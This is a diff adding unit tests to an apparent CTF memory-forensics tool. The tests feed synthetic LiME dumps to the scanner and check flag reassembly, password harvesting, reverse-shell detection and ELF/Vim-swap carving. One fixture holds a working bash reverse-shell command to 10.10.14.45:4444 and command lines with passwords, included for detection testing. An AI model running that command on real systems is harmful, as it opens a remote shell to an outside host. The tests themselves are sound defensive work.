@@ -676,6 +676,70 @@ class TestAutomotionForensics(unittest.TestCase):
         res = self.stego.analyze_office_document(pptx_path)
         self.assertTrue(any("picoCTF{m4cr0h4rd_w34kedge}" in fl["flag"] for fl in res.get("flags_found", [])))
 
+    def test_memory_multipart_split_flag_assembly(self):
+        """Test multi-part split flag auto-assembly from RAM (HackToday EVTX & memory pattern)."""
+        # Create a synthetic memory chunk with 3 parts
+        chunk = (
+            b"# PowerShell script fragment 1\n"
+            b"$part1 = '# (part 1/3) HackToday26{split_memory_'\n"
+            b"# Middle chunk with some memory noise\n"
+            b"$env:SYS = '# (part 2/3) pieces_assembled_'\n"
+            b"# Final piece\n"
+            b"$done = '# (part 3/3) successfully!}'\n"
+        )
+        lime_path = os.path.join(self.test_dir, "split_test.lime")
+        with open(lime_path, "wb") as f:
+            f.write(struct.pack("<IIQQQ", 0x4C694D45, 1, 0, len(chunk) - 1, 0) + chunk)
+
+        res = self.mem.scan_memory_dump(lime_path)
+        self.assertTrue(any("HackToday26{split_memory_pieces_assembled_successfully!}" in fl["flag"] for fl in res.get("flags_found", [])))
+
+    def test_memory_password_harvesting_and_reverse_shells(self):
+        """Test command password harvesting (openssl, 7z) and reverse shell detection from RAM."""
+        chunk = (
+            b"sudo openssl enc -d -aes-256-cbc -in secret.enc -k Sup3rK3y!2026\n"
+            b"7z x archive.7z -pHackTodayPass123\n"
+            b"bash -i >& /dev/tcp/10.10.14.45/4444 0>&1\n"
+        )
+        lime_path = os.path.join(self.test_dir, "creds_test.lime")
+        with open(lime_path, "wb") as f:
+            f.write(struct.pack("<IIQQQ", 0x4C694D45, 1, 0, len(chunk) - 1, 0) + chunk)
+
+        res = self.mem.scan_memory_dump(lime_path)
+        self.assertIn("Sup3rK3y!2026", res.get("extracted_passwords", []))
+        self.assertIn("HackTodayPass123", res.get("extracted_passwords", []))
+        self.assertTrue(any("/dev/tcp/10.10.14.45/4444" in s for s in res.get("reverse_shells", [])))
+
+    def test_memory_elf_carving_and_vim_swap(self):
+        """Test in-memory ELF carving and Vim swap file extraction."""
+        # 1. Vim swap block with flag
+        vim_swp = bytearray(4096)
+        vim_swp[0:5] = b"b0VIM"
+        vim_flag = b"HackToday26{vim_swp_recovered_from_ram}"
+        vim_swp[100:100+len(vim_flag)] = vim_flag
+
+        # 2. Minimal valid 64-bit ELF header (ET_REL / LKM) with flag inside
+        elf_data = bytearray(1024)
+        elf_data[0:4] = b"\x7fELF"
+        elf_data[4] = 2  # 64-bit
+        elf_data[5] = 1  # little-endian
+        elf_data[6] = 1  # version
+        struct.pack_into("<H", elf_data, 16, 1)  # e_type = ET_REL (1)
+        struct.pack_into("<H", elf_data, 18, 0x3E)  # e_machine = x86_64
+        elf_flag = b"HackToday26{lkm_rootkit_carved_from_ram}"
+        elf_data[200:200+len(elf_flag)] = elf_flag
+
+        lime_path = os.path.join(self.test_dir, "elf_vim.lime")
+        combined = bytes(vim_swp) + bytes(elf_data)
+        with open(lime_path, "wb") as f:
+            f.write(struct.pack("<IIQQQ", 0x4C694D45, 1, 0, len(combined) - 1, 0) + combined)
+
+        res = self.mem.scan_memory_dump(lime_path)
+        self.assertTrue(any("HackToday26{vim_swp_recovered_from_ram}" in fl["flag"] for fl in res.get("flags_found", [])))
+        self.assertTrue(any("HackToday26{lkm_rootkit_carved_from_ram}" in fl["flag"] for fl in res.get("flags_found", [])))
+        self.assertTrue(any("LKM/Relocatable" in ce["type"] for ce in res.get("carved_elfs", [])))
+
+
 
 if __name__ == "__main__":
     unittest.main()
